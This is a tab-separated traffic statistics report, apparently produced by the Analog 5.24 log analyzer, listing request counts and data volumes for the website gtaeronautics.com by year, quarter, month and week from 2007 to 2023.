x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2023	04	02	05	51
x	FR	2007	12	18	17	05
x	LR	2023	03	31	23	21
x	E7	2023	04	02	05	51
x	SR	1120693
x	S7	1678
x	NC	437829
x	C7	0
x	FL	448156
x	F7	542
x	RR	199
x	R7	2
x	NH	98912
x	H7	326
x	BT	54672653602
x	B7	198448159
1	Rr	27695	2.471	2023
1	Rr	82334	7.347	2022
1	Rr	98917	8.826	2021
1	Rr	89380	7.975	2020
1	Rr	80088	7.146	2019
1	Rr	68927	6.150	2018
1	Rr	60168	5.369	2017
1	Rr	73316	6.542	2016
1	Rr	80796	7.209	2015
1	Rr	110773	9.884	2014
1	Rr	65173	5.815	2013
1	Rr	60742	5.420	2012
1	Rr	57015	5.087	2011
1	Rr	22139	1.975	2010
1	Rr	69710	6.220	2009
1	Rr	71820	6.409	2008
1	Rr	1700	0.152	2007
1	*BT	R	110773	2014
Q	Rr	27695	2.471	2023	1
Q	Rr	20307	1.812	2022	4
Q	Rr	20362	1.817	2022	3
Q	Rr	21795	1.945	2022	2
Q	Rr	19870	1.773	2022	1
Q	Rr	21154	1.888	2021	4
Q	Rr	26826	2.394	2021	3
Q	Rr	30675	2.737	2021	2
Q	Rr	20262	1.808	2021	1
Q	Rr	22199	1.981	2020	4
Q	Rr	23882	2.131	2020	3
Q	Rr	21656	1.932	2020	2
Q	Rr	21643	1.931	2020	1
Q	Rr	19098	1.704	2019	4
Q	Rr	19668	1.755	2019	3
Q	Rr	19827	1.769	2019	2
Q	Rr	21495	1.918	2019	1
Q	Rr	18129	1.618	2018	4
Q	Rr	17138	1.529	2018	3
Q	Rr	16928	1.510	2018	2
Q	Rr	16732	1.493	2018	1
Q	Rr	15937	1.422	2017	4
Q	Rr	0	0.000	2017	3
Q	Rr	16831	1.502	2017	2
Q	Rr	27400	2.445	2017	1
Q	Rr	22114	1.973	2016	4
Q	Rr	17621	1.572	2016	3
Q	Rr	15878	1.417	2016	2
Q	Rr	17703	1.580	2016	1
Q	Rr	16575	1.479	2015	4
Q	Rr	22104	1.972	2015	3
Q	Rr	22485	2.006	2015	2
Q	Rr	19632	1.752	2015	1
Q	Rr	21142	1.887	2014	4
Q	Rr	22272	1.987	2014	3
Q	Rr	31453	2.807	2014	2
Q	Rr	35906	3.204	2014	1
Q	Rr	16436	1.467	2013	4
Q	Rr	15216	1.358	2013	3
Q	Rr	16545	1.476	2013	2
Q	Rr	16976	1.515	2013	1
Q	Rr	16578	1.479	2012	4
Q	Rr	12511	1.116	2012	3
Q	Rr	15816	1.411	2012	2
Q	Rr	15837	1.413	2012	1
Q	Rr	15444	1.378	2011	4
Q	Rr	17386	1.551	2011	3
Q	Rr	9395	0.838	2011	2
Q	Rr	14790	1.320	2011	1
Q	Rr	1603	0.143	2010	4
Q	Rr	0	0.000	2010	3
Q	Rr	14047	1.253	2010	2
Q	Rr	6489	0.579	2010	1
Q	Rr	16350	1.459	2009	4
Q	Rr	18220	1.626	2009	3
Q	Rr	17115	1.527	2009	2
Q	Rr	18025	1.608	2009	1
Q	Rr	15905	1.419	2008	4
Q	Rr	15660	1.397	2008	3
Q	Rr	22448	2.003	2008	2
Q	Rr	17807	1.589	2008	1
Q	Rr	1700	0.152	2007	4
Q	*BT	R	35906	2014	1
m	Rr	10848	0.968	2023	03
m	Rr	8360	0.746	2023	02
m	Rr	8487	0.757	2023	01
m	Rr	6950	0.620	2022	12
m	Rr	6349	0.567	2022	11
m	Rr	7008	0.625	2022	10
m	Rr	6740	0.601	2022	09
m	Rr	6863	0.612	2022	08
m	Rr	6759	0.603	2022	07
m	Rr	6567	0.586	2022	06
m	Rr	8427	0.752	2022	05
m	Rr	6801	0.607	2022	04
m	Rr	6380	0.569	2022	03
m	Rr	6175	0.551	2022	02
m	Rr	7315	0.653	2022	01
m	Rr	7667	0.684	2021	12
m	Rr	7097	0.633	2021	11
m	Rr	6390	0.570	2021	10
m	Rr	6059	0.541	2021	09
m	Rr	9092	0.811	2021	08
m	Rr	11675	1.042	2021	07
m	Rr	10152	0.906	2021	06
m	Rr	10231	0.913	2021	05
m	Rr	10292	0.918	2021	04
m	Rr	7948	0.709	2021	03
m	Rr	5800	0.518	2021	02
m	Rr	6514	0.581	2021	01
m	Rr	8069	0.720	2020	12
m	Rr	6579	0.587	2020	11
m	Rr	7551	0.674	2020	10
m	Rr	8028	0.716	2020	09
m	Rr	7741	0.691	2020	08
m	Rr	8113	0.724	2020	07
m	Rr	7317	0.653	2020	06
m	Rr	6898	0.616	2020	05
m	Rr	7441	0.664	2020	04
m	Rr	7524	0.671	2020	03
m	Rr	7322	0.653	2020	02
m	Rr	6797	0.606	2020	01
m	Rr	6573	0.587	2019	12
m	Rr	5917	0.528	2019	11
m	Rr	6608	0.590	2019	10
m	Rr	6791	0.606	2019	09
m	Rr	6597	0.589	2019	08
m	Rr	6280	0.560	2019	07
m	Rr	6317	0.564	2019	06
m	Rr	6847	0.611	2019	05
m	Rr	6663	0.595	2019	04
m	Rr	7059	0.630	2019	03
m	Rr	6374	0.569	2019	02
m	Rr	8062	0.719	2019	01
m	Rr	6957	0.621	2018	12
m	Rr	5422	0.484	2018	11
m	Rr	5750	0.513	2018	10
m	Rr	5458	0.487	2018	09
m	Rr	5735	0.512	2018	08
m	Rr	5945	0.530	2018	07
m	Rr	7110	0.634	2018	06
m	Rr	6440	0.575	2018	05
m	Rr	3378	0.301	2018	04
m	Rr	5789	0.517	2018	03
m	Rr	5369	0.479	2018	02
m	Rr	5574	0.497	2018	01
m	Rr	3906	0.349	2017	12
m	Rr	6533	0.583	2017	11
m	Rr	5498	0.491	2017	10
m	Rr	0	0.000	2017	09
m	Rr	0	0.000	2017	08
m	Rr	0	0.000	2017	07
m	Rr	0	0.000	2017	06
m	Rr	6832	0.610	2017	05
m	Rr	9999	0.892	2017	04
m	Rr	11887	1.061	2017	03
m	Rr	7941	0.709	2017	02
m	Rr	7572	0.676	2017	01
m	Rr	9483	0.846	2016	12
m	Rr	7121	0.635	2016	11
m	Rr	5510	0.492	2016	10
m	Rr	6288	0.561	2016	09
m	Rr	5888	0.525	2016	08
m	Rr	5445	0.486	2016	07
m	Rr	5042	0.450	2016	06
m	Rr	5495	0.490	2016	05
m	Rr	5341	0.477	2016	04
m	Rr	5558	0.496	2016	03
m	Rr	5548	0.495	2016	02
m	Rr	6597	0.589	2016	01
m	Rr	5574	0.497	2015	12
m	Rr	5330	0.476	2015	11
m	Rr	5671	0.506	2015	10
m	Rr	6196	0.553	2015	09
m	Rr	6788	0.606	2015	08
m	Rr	9120	0.814	2015	07
m	Rr	7156	0.639	2015	06
m	Rr	5694	0.508	2015	05
m	Rr	9635	0.860	2015	04
m	Rr	6215	0.555	2015	03
m	Rr	6084	0.543	2015	02
m	Rr	7333	0.654	2015	01
m	Rr	6608	0.590	2014	12
m	Rr	6997	0.624	2014	11
m	Rr	7537	0.673	2014	10
m	Rr	7043	0.628	2014	09
m	Rr	7324	0.654	2014	08
m	Rr	7905	0.705	2014	07
m	Rr	11654	1.040	2014	06
m	Rr	9211	0.822	2014	05
m	Rr	10588	0.945	2014	04
m	Rr	7817	0.698	2014	03
m	Rr	15229	1.359	2014	02
m	Rr	12860	1.148	2014	01
m	Rr	5325	0.475	2013	12
m	Rr	5513	0.492	2013	11
m	Rr	5598	0.500	2013	10
m	Rr	4655	0.415	2013	09
m	Rr	4938	0.441	2013	08
m	Rr	5623	0.502	2013	07
m	Rr	5492	0.490	2013	06
m	Rr	5211	0.465	2013	05
m	Rr	5842	0.521	2013	04
m	Rr	6068	0.541	2013	03
m	Rr	5055	0.451	2013	02
m	Rr	5853	0.522	2013	01
m	Rr	5688	0.508	2012	12
m	Rr	5477	0.489	2012	11
m	Rr	5413	0.483	2012	10
m	Rr	4331	0.386	2012	09
m	Rr	3866	0.345	2012	08
m	Rr	4314	0.385	2012	07
m	Rr	4655	0.415	2012	06
m	Rr	6047	0.540	2012	05
m	Rr	5114	0.456	2012	04
m	Rr	6128	0.547	2012	03
m	Rr	5430	0.485	2012	02
m	Rr	4279	0.382	2012	01
m	Rr	5548	0.495	2011	12
m	Rr	4779	0.426	2011	11
m	Rr	5117	0.457	2011	10
m	Rr	5431	0.485	2011	09
m	Rr	6256	0.558	2011	08
m	Rr	5699	0.509	2011	07
m	Rr	5420	0.484	2011	06
m	Rr	3975	0.355	2011	05
m	Rr	0	0.000	2011	04
m	Rr	3608	0.322	2011	03
m	Rr	5171	0.461	2011	02
m	Rr	6011	0.536	2011	01
m	Rr	1603	0.143	2010	12
m	Rr	0	0.000	2010	11
m	Rr	0	0.000	2010	10
m	Rr	0	0.000	2010	09
m	Rr	0	0.000	2010	08
m	Rr	0	0.000	2010	07
m	Rr	4101	0.366	2010	06
m	Rr	5018	0.448	2010	05
m	Rr	4928	0.440	2010	04
m	Rr	5095	0.455	2010	03
m	Rr	1394	0.124	2010	02
m	Rr	0	0.000	2010	01
m	Rr	4665	0.416	2009	12
m	Rr	6187	0.552	2009	11
m	Rr	5498	0.491	2009	10
m	Rr	5066	0.452	2009	09
m	Rr	5718	0.510	2009	08
m	Rr	7436	0.664	2009	07
m	Rr	5685	0.507	2009	06
m	Rr	6120	0.546	2009	05
m	Rr	5310	0.474	2009	04
m	Rr	5515	0.492	2009	03
m	Rr	6123	0.546	2009	02
m	Rr	6387	0.570	2009	01
m	Rr	5763	0.514	2008	12
m	Rr	5420	0.484	2008	11
m	Rr	4722	0.421	2008	10
m	Rr	5435	0.485	2008	09
m	Rr	4843	0.432	2008	08
m	Rr	5382	0.480	2008	07
m	Rr	6082	0.543	2008	06
m	Rr	9946	0.887	2008	05
m	Rr	6420	0.573	2008	04
m	Rr	5431	0.485	2008	03
m	Rr	6469	0.577	2008	02
m	Rr	5907	0.527	2008	01
m	Rr	1700	0.152	2007	12
m	*BT	R	15229	2014	02
W	Rr	1701	0.152	2023	03	26
W	Rr	1943	0.173	2023	03	19
W	Rr	2225	0.199	2023	03	12
W	Rr	2192	0.196	2023	03	05
W	Rr	4055	0.362	2023	02	26
W	Rr	2406	0.215	2023	02	19
W	Rr	1898	0.169	2023	02	12
W	Rr	1890	0.169	2023	02	05
W	Rr	1861	0.166	2023	01	29
W	Rr	1686	0.150	2023	01	22
W	Rr	1779	0.159	2023	01	15
W	Rr	1833	0.164	2023	01	08
W	Rr	2226	0.199	2023	01	01
W	Rr	1280	0.114	2022	12	25
W	Rr	1806	0.161	2022	12	18
W	Rr	1773	0.158	2022	12	11
W	Rr	1532	0.137	2022	12	04
W	Rr	1586	0.142	2022	11	27
W	Rr	1093	0.098	2022	11	20
W	Rr	1366	0.122	2022	11	13
W	Rr	1972	0.176	2022	11	06
W	Rr	1396	0.125	2022	10	30
W	Rr	1547	0.138	2022	10	23
W	Rr	1641	0.146	2022	10	16
W	Rr	1747	0.156	2022	10	09
W	Rr	1568	0.140	2022	10	02
